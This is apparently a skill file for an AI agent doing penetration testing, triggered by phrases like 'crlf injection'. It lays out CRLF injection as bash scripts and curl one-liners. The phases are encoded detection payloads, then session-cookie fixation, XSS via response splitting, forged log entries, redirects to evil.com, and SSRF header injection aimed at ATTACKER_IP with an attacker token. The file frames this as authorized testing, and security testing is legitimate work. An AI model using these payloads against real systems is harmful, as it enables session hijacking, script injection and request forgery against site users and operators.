---
name: vuln-crlf
description: "CRLF injection testing — HTTP header injection, response splitting, cookie injection, XSS via CRLF, log injection, redirect via CRLF. Triggers: 'crlf injection', 'crlf', 'response splitting', 'header injection', 'http header injection', 'cookie injection', 'http response splitting', 'newline injection'."
---

# CRLF Injection Testing

Inject carriage return + line feed (`\r\n`) to split HTTP responses or inject headers.

---

## Phase 1: Detection

```bash
TARGET="https://TARGET"
COLLAB="ATTACKER_DOMAIN"

# Basic CRLF probe in URL path and parameters:
PAYLOADS=(
  "%0d%0aX-Injected: crlf-test"
  "%0aX-Injected: crlf-test"
  "%0d%0aSet-Cookie: malicious=1"
  "%E5%98%8D%E5%98%8AX-Injected: crlf-test"   # UTF-8 CRLF
  "%E5%98%8D%E5%98%8ALocation: https://$COLLAB"
  "%0d%0aContent-Length: 0%0d%0a%0d%0a"
)

for P in "${PAYLOADS[@]}"; do
  RESP=$(curl -s -I "$TARGET/page?redirect=${P}" 2>/dev/null)
  if echo "$RESP" | grep -qi "X-Injected\|malicious=1"; then
    echo "CRLF DETECTED: $P"
  fi
done | tee output/crlf_detect.txt

# Check redirect parameters:
curl -s -I "$TARGET/redirect?url=https://example.com%0d%0aX-Injected:%20test" | grep -i "X-Injected"
```

---

## Phase 2: Exploitation

```bash
TARGET="https://TARGET"

# Cookie injection — set session cookie:
curl -s -I "$TARGET/page?next=https://example.com%0d%0aSet-Cookie:%20session=ATTACKER_SESSION;%20path=/"
# Victim clicking link gets their session cookie overwritten

# XSS via CRLF response splitting:
XSS_PAYLOAD='%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>'
curl -s "$TARGET/redirect?url=$XSS_PAYLOAD"

# Log injection (forge log entries):
LOG_INJECT='%0a127.0.0.1 - admin [01/Jan/2024:00:00:00] "GET /admin/delete-user HTTP/1.1" 200 0'
curl -s "$TARGET/page?input=$LOG_INJECT"

# Redirect via CRLF:
curl -s -I "$TARGET/page?url=https://target.com%0d%0aLocation:%20https://evil.com" | grep -i "location:"
```

---

## Phase 3: SSRF via CRLF Header Injection

```bash
TARGET="https://TARGET"
COLLAB="ATTACKER_IP:8080"

# Inject Host header via CRLF to reroute request:
curl -s "$TARGET/proxy?url=https://example.com%0d%0aHost:%20$COLLAB"

# Inject SSRF payload with CRLF-split headers:
curl -s "$TARGET/fetch?url=https://allowed.com%0d%0aAuthorization:%20Bearer%20ATTACKER_TOKEN"
```

---

## Output

Save to `output/`:
- `crlf_detect.txt` — detected CRLF injection points
- `crlf_poc.txt` — HTTP request showing injected headers

## Next Phase

→ `vuln-xss` to chain XSS with CRLF
→ `pentest-report` to document findings
